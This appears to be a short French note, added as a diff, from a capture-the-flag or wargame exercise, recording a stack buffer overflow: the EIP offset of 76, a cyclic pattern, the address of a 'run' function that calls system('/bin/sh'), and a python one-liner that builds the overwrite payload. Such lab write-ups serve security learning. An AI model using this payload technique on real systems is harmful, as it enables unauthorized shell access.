@@ -1,0 +1,8 @@
+eip est a l'ofset 76.
+
+76 caractere random : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4A
+
+sous objdump on vois que la fonction run qui contient system(/bin/sh) commence a l'adresse 0x08048444
+
+python -c 'print("a" *76 + "\x44\x84\x04\x08")'
+
